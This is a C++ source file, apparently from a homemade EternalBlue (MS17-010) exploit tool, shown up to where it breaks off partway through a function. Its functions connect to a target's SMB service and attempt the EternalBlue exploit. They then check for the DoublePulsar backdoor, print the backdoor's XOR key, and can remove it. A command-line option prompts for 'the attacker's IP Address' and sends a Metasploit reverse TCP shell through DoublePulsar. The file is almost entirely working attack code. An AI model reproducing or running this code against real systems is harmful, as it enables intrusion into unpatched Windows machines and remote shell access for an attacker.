#include "smb.h"
#include <iostream>

#pragma comment(lib, "crypt32")
#pragma comment(lib, "ws2_32")

#pragma auto_inline(off)

#pragma warning(push)
#pragma warning(disable : 4244)

using namespace std;

STRING ThisMachinesIpAddress = { 0 };

//EternalBlue.exe < ip address > [optional < --killdopu | --dopuexecshellcode > to kill doublepulsar if its already installed]
int wmain(int argc, wchar_t** argv)
{
	static BUFFER nego, setup, tree, tmp;
	static smb_info info;
	static UNICODE_STRING unc, ip, additionalargw, tempstringw, execargstringw, killargstringw;
	static HANDLE hthread;
	static DWORD dwtid, dwexitcode;
	static ANYPOINTER p;
	static STRING s;
	static char console_input_buffer[0x100];
	
	InitUnicodeString(__LPREFIX("\\\\127.0.0.1\\IPC$"), &unc);

	if (argc == 1)
	{
		InitUnicodeString(__LPREFIX("127.0.0.1"), &ip);
	}
	else if (argc >= 2)
	{
		bwsalloc(&tmp, (DWORD)((wcslen(argv[1]) * sizeof(WCHAR)) + sizeof(WCHAR)));
		cpy(tmp.pbdata, argv[1], wcslen(argv[1]) * sizeof(WCHAR));
		if (!find_memory_pattern(&tmp, &p, L".", sizeof(wchar_t)))
		{
			InitUnicodeString(L"127.0.0.1", &ip);
		}
		else
		{
			InitUnicodeString(argv[1], &ip);
		}
		bwsfree(&tmp);
	}

	ConvertUnicodeToString(&ip, &s);
	
	//eternalblue exploit attempt
	hthread = CreateThread(NULL, 0, &EternalBlueExploit, s.Buffer, 0, &dwtid);
	
	if (isnull(hthread))
	{
		FreeString(&s);
		return STATUS_INVALID_HANDLE;
	}

	WaitForSingleObject(hthread, INFINITE);
	GetExitCodeThread(hthread, &dwexitcode);
	CloseHandle(hthread);
	
	if (GetUlong(&dwexitcode) != 0)
	{
		dbgprint("[%S]: host %ws:%u has been most likely patched to MS17-10\n", __FUNCTION__, ip.Buffer, 445U);
		FreeString(&s);
		FreeUnicodeString(&ip);
		return *(int*)(&dwexitcode);
	}
	else
	{
		//double pulsar backdoor check
		hthread = CreateThread(NULL, 0, &DoublePulsarIsInstalled, s.Buffer, 0, &dwtid);

		if (hthread == NULL)
		{
			FreeString(&s);
			FreeUnicodeString(&ip);
			return STATUS_INVALID_HANDLE;
		}

		WaitForSingleObject(hthread, INFINITE);
		GetExitCodeThread(hthread, &dwexitcode);
		CloseHandle(hthread);
	}



	if (argc >= 3)
	{
		//set our variables to zero
		RtlZeroMemory(&p, sizeof(p)), RtlZeroMemory(&tmp, sizeof(tmp));
		PutUlong(&dwtid, 0), PutUlongPtr(&hthread, 0);

		InitUnicodeString(argv[2], &additionalargw);
		InitUnicodeString(TEXT("--dopuexecshellcode"), &execargstringw);
		InitUnicodeString(TEXT("--dopukill"), &killargstringw);
		

		if (cmp(additionalargw.Buffer, execargstringw.Buffer, (DWORD)min(additionalargw.Length, execargstringw.Length)))
		{
			_dbgprint("[%S] please enter the attacker\'s IP Address:\t", __FUNCTION__);
			cin >> console_input_buffer;
			_dbgprint("\n");

			InitString(console_input_buffer, &ThisMachinesIpAddress);

			hthread = CreateThread(NULL, 0, &DoublePulsarExecuteShellcode, s.Buffer, 0, &dwtid);

			if (isnull(hthread))
			{
				PutUlong(&dwexitcode, STATUS_INVALID_HANDLE);
				FreeUnicodeString(&execargstringw);
				FreeUnicodeString(&killargstringw);
				FreeUnicodeString(&additionalargw);
				goto cleanup;
			}

			_dbgprint("[%S]: attempting to execute metasploit reverse tcp shell shellcode on the remote host using doublepulsar...\n", __FUNCTION__);
			WaitForSingleObject(hthread, INFINITE);
			GetExitCodeThread(hthread, &dwexitcode);
			CloseHandle(hthread);
		}
		else if (cmp(additionalargw.Buffer, killargstringw.Buffer, (DWORD)min(additionalargw.Length, killargstringw.Length)))
		{
			hthread = CreateThread(NULL, 0, &DoublePulsarUninstall, s.Buffer, 0, &dwtid);
			
			if (isnull(hthread))
			{
				PutUlong(&dwexitcode, STATUS_INVALID_HANDLE);
				FreeUnicodeString(&execargstringw);
				FreeUnicodeString(&killargstringw);
				FreeUnicodeString(&additionalargw);
				goto cleanup;
			}

			_dbgprint("[%S]: attempting to kill doublepulsar backdoor...\n", __FUNCTION__);
			WaitForSingleObject(hthread, INFINITE);
			GetExitCodeThread(hthread, &dwexitcode);
			CloseHandle(hthread);
		}

		FreeUnicodeString(&execargstringw);
		FreeUnicodeString(&killargstringw);
		FreeUnicodeString(&additionalargw);
	}	


cleanup:
	FreeString(&s);
	if(notnull(ThisMachinesIpAddress.Buffer))
		FreeString(&ThisMachinesIpAddress);
	if (notnull(unc.Buffer))
		FreeUnicodeString(&unc);
	FreeUnicodeString(&ip);
	return *(int*)(&dwexitcode);
}


DWORD __stdcall EternalBlueIsVulnerable(PVOID pvip)
{
	PCSTR paramip = (PCSTR)pvip;
	UNICODE_STRING wip = { 0 };
	STRING ip = { 0 };
	static smb_info info;
	static RequestPacketLinkedList requests[0x20], * req;
	static ResponsePacketLinkedList responses[0x20], * resp;
	DWORD i = 0, j = 0, currententryval = 0, numberofreqentries = 0x20, attempts = 3, groomcount = 0, numberofrespentries = 0x20, peek_nmpipe_packet_index = 0, numberoftransintranslist = 0x10;
	WORD tmpmid = 0;
	SOCKET s[2] = { 0 };
	WSAData wsa = { 0 };
	sockaddr_in sa[2] = { 0 };
	unsigned status[0x10] = { 0 }, * connectstatus = (status + 1);
	BOOLEAN bstatus = 0, isvulnerable = 0;
	static ANYPOINTER any;
	static DWORD smbrequestandresponsecount;
	TRANS_REQUEST_LIST* transactionlist = NULL;

	InitString(paramip, &ip);
	ConvertStringToUnicode(&ip, &wip);

	info.sockaddrpointer = sa;
	info.socketpointer = s;
	info.wsapointer = &wsa;

	info.connection_handle += (random() % 0x1000);

	set_pid(&info, 65279);
	set_mid(&info, 64);
	set_tid(&info, 0);
	set_uid(&info, 0);

	//setup request list

	for (i = 0, j = 0; i < numberofreqentries; i++)
	{
		req = &requests[i];
		j = (i + 1);
		if (j == numberofreqentries)
		{
			req->NextEntry = NULL;
		}
		else if (j < numberofreqentries)
		{
			req->NextEntry = &requests[j];
		}
	}

	req = requests;

	//setup response list
	for (i = 0, j = 0; i < numberofrespentries; i++)
	{
		resp = (responses + i), j = (i + 1);

		if (j == numberofrespentries)
		{
			resp->NextEntry = NULL;
		}
		else if (j < numberofrespentries)
		{
			resp->NextEntry = (responses + j);
		}
	}

	resp = responses;

	
	do
	{
		PutUnsigned(connectstatus, TargetConnect(GetSocket(s), *sa, wsa, ip.Buffer, GetUnsigned(status)));

		if ((GetUlong(connectstatus) != 0) || (GetUlong(status) != 0))
		{
			dbgprint("[%S]: %S could not connect to the target %ws:%u...\n", __FUNCTION__, "TargetConnect", wip.Buffer, 445U);
			bstatus = FALSE;
			break;
		}

		bstatus = SendRecvNegotiate(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		if (!bstatus)
		{
#ifdef _DEBUG
			errmsg(__FUNCSIG__, __LINE__, WSAGetLastError() | info.srv_last_error);
#endif
			break;
		}

		req = req->NextEntry;
		resp = resp->NextEntry;


		bstatus = SendRecvSessionSetupAndx(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		bstatus = SendRecvTreeConnectAndx(req, resp, GetSocket(s), &info, wip.Buffer);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;


		bstatus = SendRecvTransPeekNamedPipeCheck(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		PutUlong(&peek_nmpipe_packet_index, GetUlong(&smbrequestandresponsecount) - 1);

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		if (isnull(resp->ThisPacket.pbdata))
		{
			isvulnerable = FALSE;
			break;
		}

		update_smb_info(&info, &resp->ThisPacket);

		switch (GetUlong(&resp->ThisSmb->Status.NtStatus))
		{
		case NT_STATUS_INSUFF_SERVER_RESOURCES:
			isvulnerable = TRUE;
			break;
		case NT_STATUS_ACCESS_DENIED:
			isvulnerable = FALSE;
			break;
		default:
			isvulnerable = FALSE;
			PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
			break;
		}

		req = req->NextEntry;
		resp = resp->NextEntry;
	} while (FALSE);

	do
	{
		bstatus = SendRecvTreeDisconnect(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		req = req->NextEntry;
		resp = resp->NextEntry;

		bstatus = SendRecvLogoffAndx(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);
	} while (FALSE);

	req = requests + GetUlong(&peek_nmpipe_packet_index);
	resp = responses + GetUlong(&peek_nmpipe_packet_index);

	if (isnull(resp->ThisPacket.pbdata))
	{
		PutUlong(status, STATUS_FAIL);
		closesocket(GetSocket(s));
		WSACleanup();
		FreeRequestLinkedListBuffers(requests, &numberofreqentries);
		FreeResponseLinkedListBuffers(responses, &numberofrespentries);
		FreeUnicodeString(&wip);
		FreeString(&ip);
		return GetUlong(status);
	}

	if (req->ThisSmb->Command != SMB_COM_TRANS || resp->ThisSmb->Command != SMB_COM_TRANS)
	{
		errmsg(__FUNCSIG__, __LINE__, 1);
		PutUlong(status, 1);
		closesocket(GetSocket(s));
		WSACleanup();
		FreeRequestLinkedListBuffers(requests, &numberofreqentries);
		FreeResponseLinkedListBuffers(responses, &numberofrespentries);
		FreeUnicodeString(&wip);
		FreeString(&ip);
		return GetUlong(status);
	}
	else
	{
		if (!isvulnerable)
		{
			closesocket(GetSocket(s));
			WSACleanup();
			PutUlong(status, STATUS_FAIL);
			FreeRequestLinkedListBuffers(requests, &numberofreqentries);
			FreeResponseLinkedListBuffers(responses, &numberofrespentries);
			FreeUnicodeString(&wip);
			FreeString(&ip);
			return GetUlong(status);
		}
		else if ((isvulnerable & TRUE) && (GetUlong(&resp->ThisSmb->Status.NtStatus) & NT_STATUS_INSUFF_SERVER_RESOURCES))
		{
			closesocket(GetSocket(s));
			WSACleanup();
			PutUlong(status, NT_STATUS_SUCCESS);
			FreeRequestLinkedListBuffers(requests, &numberofreqentries);
			FreeResponseLinkedListBuffers(responses, &numberofrespentries);
			FreeUnicodeString(&wip);
			FreeString(&ip);
			return GetUlong(status);
		}
	}
	return STATUS_FAIL;

}

DWORD __stdcall DoublePulsarIsInstalled(PVOID pvip)
{
	BUFFER tmp = { 0 };
	PCSTR paramip = (PCSTR)pvip;
	UNICODE_STRING wip = { 0 };
	STRING ip = { 0 };
	static smb_info info;
	static RequestPacketLinkedList requests[0x20], * req;
	static ResponsePacketLinkedList responses[0x20], * resp;
	DWORD i = 0, j = 0, currententryval = 0, numberofreqentries = 0x20, leakentrycount = 0x8, attempts = 3, groomcount = 0, numberofrespentries = 0x20;
	WORD tmpmid = 0;
	SOCKET s[2] = { 0 };
	WSAData wsa = { 0 };
	sockaddr_in sa[2] = { 0 };
	unsigned status[0x10] = { 0 }, * connectstatus = (status + 1);
	BOOLEAN bstatus = 0;
	static ANYPOINTER any;
	static DWORD smbrequestandresponsecount;

	InitString(paramip, &ip);
	ConvertStringToUnicode(&ip, &wip);

	info.sockaddrpointer = sa;
	info.socketpointer = s;
	info.wsapointer = &wsa;

	info.connection_handle += (random() % 0x1000);

	set_pid(&info, 65279);
	set_mid(&info, 64);
	set_tid(&info, 0);
	set_uid(&info, 0);

	//setup request list

	for (i = 0, j = 0; i < numberofreqentries; i++)
	{
		req = &requests[i];
		j = (i + 1);
		if (j == numberofreqentries)
		{
			req->NextEntry = NULL;
		}
		else if (j < numberofreqentries)
		{
			req->NextEntry = &requests[j];
		}
	}

	req = requests;

	//setup response list
	for (i = 0, j = 0; i < numberofrespentries; i++)
	{
		resp = (responses + i), j = (i + 1);

		if (j == numberofrespentries)
		{
			resp->NextEntry = NULL;
		}
		else if (j < numberofrespentries)
		{
			resp->NextEntry = (responses + j);
		}
	}
	resp = responses;

	//start the check to see if doublepulsar backdoor is installed on smb service
	do
	{
		PutUnsigned(connectstatus, TargetConnect(GetSocket(s), *sa, wsa, ip.Buffer, GetUnsigned(status)));

		if ((GetUlong(connectstatus) != 0) || (GetUlong(status) != 0))
		{
			dbgprint("[%S]: %S could not connect to the target %ws:%u...\n", __FUNCTION__, "TargetConnect", wip.Buffer, 445U);
			bstatus = FALSE;
			break;
		}

		bstatus = SendRecvNegotiate(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		if (!bstatus)
		{
#ifdef _DEBUG
			errmsg(__FUNCSIG__, __LINE__, WSAGetLastError() | info.srv_last_error);
#endif
			break;
		}

		req = req->NextEntry;
		resp = resp->NextEntry;


		bstatus = SendRecvSessionSetupAndx(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		bstatus = SendRecvTreeConnectAndx(req, resp, GetSocket(s), &info, wip.Buffer);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		//send TRANSACTION2 SESSION_SETUP request to trigger double pulsars overwritten SESSION_SETUP handler function pointer
		bstatus = SendRecvTrans2SessionSetup(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);

		PutUshort(&tmpmid, get_mid(&info));
		tmpmid += DOPU_ERROR_SUCCESS;
		set_special_mid(&info, GetUshort(&tmpmid));

		update_smb_info(&info, &resp->ThisPacket);

		info.DoublePulsarInstalled = ((get_mid(&info) == get_special_mid(&info)) ? TRUE : FALSE);

		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		//revert multiplex ID to original value
		set_mid(&info, GetUshort(&tmpmid) - DOPU_ERROR_SUCCESS);

		bstatus = SendRecvTreeDisconnect(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		bstatus = SendRecvLogoffAndx(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (!bstatus)
			break;
	} while (FALSE);

	PutUlong(status, ((bstatus == TRUE) ? 0 : info.srv_last_error));

	for (i = 0; i < smbrequestandresponsecount; i++)
	{
		req = &requests[i];
		resp = &responses[i];
		wprintf(L"------------------REQUEST INFO-------------------\n\n");
		wprintf(L"Netbios Length:\t0x%04X (%u bytes)\n", MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize))), MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize))));
		wprintf(L"Total packet Size:\t%u bytes\n", MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize)) + sizeof(DWORD)));
		wprintf(L"SMB Command:\t0x%02X\n", MAKEUNSIGNED(req->ThisSmb->Command));

		switch (req->ThisSmb->Command)
		{
		case SMB_COM_NEGOTIATE:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NEGOTIATE");
			break;

		case SMB_COM_SESSION_SETUP_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_SESSION_SETUP_ANDX");
			break;

		case SMB_COM_TREE_CONNECT:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_TREE_CONNECT_ANDX");
			break;

		case SMB_COM_NT_CREATE_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NT_CREATE_ANDX");
			break;

		default:
			break;
		}

		wprintf(L"SMB process ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Pid));
		wprintf(L"SMB multiplex ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Mid));
		wprintf(L"SMB user ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Uid));
		wprintf(L"SMB tree ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Tid));

		DumpHex(req->ThisPacket.pbdata, req->ThisPacket.dwsize);
		wprintf(L"\n\n");
	}

	for (i = 0; i < smbrequestandresponsecount; i++)
	{
		req = &requests[i];
		resp = &responses[i];
		wprintf(L"------------------RESPONSE INFO-------------------\n\n");
		wprintf(L"Netbios Length:\t0x%04X (%u bytes)\n", MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize))), MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize))));
		wprintf(L"Total packet Size:\t%u bytes\n", MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize)) + sizeof(DWORD)));
		wprintf(L"SMB Command:\t0x%02X\n", MAKEUNSIGNED(resp->ThisSmb->Command));
		wprintf(L"SMB NTSTATUS:\t0x%08X\n", GetUnsigned(&resp->ThisSmb->Status.NtStatus));

		switch (resp->ThisSmb->Command)
		{
		case SMB_COM_NEGOTIATE:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NEGOTIATE");
			break;

		case SMB_COM_SESSION_SETUP_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_SESSION_SETUP_ANDX");
			break;

		case SMB_COM_TREE_CONNECT:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_TREE_CONNECT_ANDX");
			break;

		case SMB_COM_NT_CREATE_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NT_CREATE_ANDX");
			break;

		default:
			break;
		}
		wprintf(L"SMB process ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Pid));
		wprintf(L"SMB multiplex ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Mid));
		wprintf(L"SMB user ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Uid));
		wprintf(L"SMB Tree ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Tid));
		DumpHex(resp->ThisPacket.pbdata, resp->ThisPacket.dwsize);
		wprintf(L"\n\n");
	}



	goto cleanup;

cleanup:

	if (info.DoublePulsarInstalled)
		PutUlong(status, 0);
	else
		PutUlong(status, STATUS_FAIL);

	resp = responses;
	if(GetUlong(status) == 0)
		_dbgprint("[+] double pulsar xor key:\t0x%08X\n", MAKEUNSIGNED(GetDoublePulsarXorKey(&responses[3].ThisPacket)));
		
	//close socket and cleanup
	if (validsock(GetSocket(s)))
		closesocket(GetSocket(s));
	WSACleanup();

	//start at begining of lists
	req = requests;
	resp = responses;
	//free buffers
	FreeRequestLinkedListBuffers(req, &numberofreqentries);
	FreeResponseLinkedListBuffers(resp, &numberofrespentries);
	FreeUnicodeString(&wip);
	FreeString(&ip);

	return GetUlong(status);

}

DWORD __stdcall DoublePulsarUninstall(PVOID pvip)
{
	BUFFER tmp = { 0 };
	PCSTR paramip = (PCSTR)pvip;
	UNICODE_STRING wip = { 0 };
	STRING ip = { 0 };
	static smb_info info;
	static RequestPacketLinkedList requests[0x20], * req;
	static ResponsePacketLinkedList responses[0x20], * resp;
	DWORD i = 0, j = 0, currententryval = 0, numberofreqentries = 0x20, leakentrycount = 0x8, attempts = 3, groomcount = 0, numberofrespentries = 0x20;
	WORD tmpmid = 0;
	SOCKET s[2] = { 0 };
	WSAData wsa = { 0 };
	sockaddr_in sa[2] = { 0 };
	unsigned status[0x10] = { 0 }, * connectstatus = (status + 1);
	BOOLEAN bstatus = 0;
	static ANYPOINTER any;
	static DWORD smbrequestandresponsecount;

	InitString(paramip, &ip);
	ConvertStringToUnicode(&ip, &wip);

	info.sockaddrpointer = sa;
	info.socketpointer = s;
	info.wsapointer = &wsa;

	info.connection_handle += (random() % 0x1000);

	set_pid(&info, 65279);
	set_mid(&info, 64);
	set_tid(&info, 0);
	set_uid(&info, 0);

	//setup request list

	for (i = 0, j = 0; i < numberofreqentries; i++)
	{
		req = &requests[i];
		j = (i + 1);
		if (j == numberofreqentries)
		{
			req->NextEntry = NULL;
		}
		else if (j < numberofreqentries)
		{
			req->NextEntry = &requests[j];
		}
	}

	req = requests;

	//setup response list
	for (i = 0, j = 0; i < numberofrespentries; i++)
	{
		resp = (responses + i), j = (i + 1);

		if (j == numberofrespentries)
		{
			resp->NextEntry = NULL;
		}
		else if (j < numberofrespentries)
		{
			resp->NextEntry = (responses + j);
		}
	}
	resp = responses;

	//start the check to see if doublepulsar backdoor is installed on smb service
	do
	{
		PutUnsigned(connectstatus, TargetConnect(GetSocket(s), *sa, wsa, ip.Buffer, GetUnsigned(status)));

		if ((GetUlong(connectstatus) != 0) || (GetUlong(status) != 0))
		{
			dbgprint("[%S]: %S could not connect to the target %ws:%u...\n", __FUNCTION__, "TargetConnect", wip.Buffer, 445U);
			bstatus = FALSE;
			break;
		}

		bstatus = SendRecvNegotiate(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		if (!bstatus)
		{
#ifdef _DEBUG
			errmsg(__FUNCSIG__, __LINE__, WSAGetLastError() | info.srv_last_error);
#endif
			break;
		}

		req = req->NextEntry;
		resp = resp->NextEntry;


		bstatus = SendRecvSessionSetupAndx(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		bstatus = SendRecvTreeConnectAndx(req, resp, GetSocket(s), &info, wip.Buffer);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		//send TRANSACTION2 SESSION_SETUP request to trigger double pulsars overwritten SESSION_SETUP handler function pointer
		bstatus = SendRecvTrans2SessionSetupPing(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);

		PutUshort(&tmpmid, get_mid(&info));
		tmpmid += DOPU_ERROR_SUCCESS;
		set_special_mid(&info, GetUshort(&tmpmid));

		update_smb_info(&info, &resp->ThisPacket);

		info.DoublePulsarInstalled = ((get_mid(&info) == get_special_mid(&info)) ? TRUE : FALSE);

		if (!bstatus)
			break;
	
		//info.DoublePulsarXorKey = GetDoublePulsarXorKey(&resp->ThisPacket);

		req = req->NextEntry;
		resp = resp->NextEntry;

		if (!info.DoublePulsarInstalled)
			goto smbdisconnect;

		//revert multiplex ID to original value
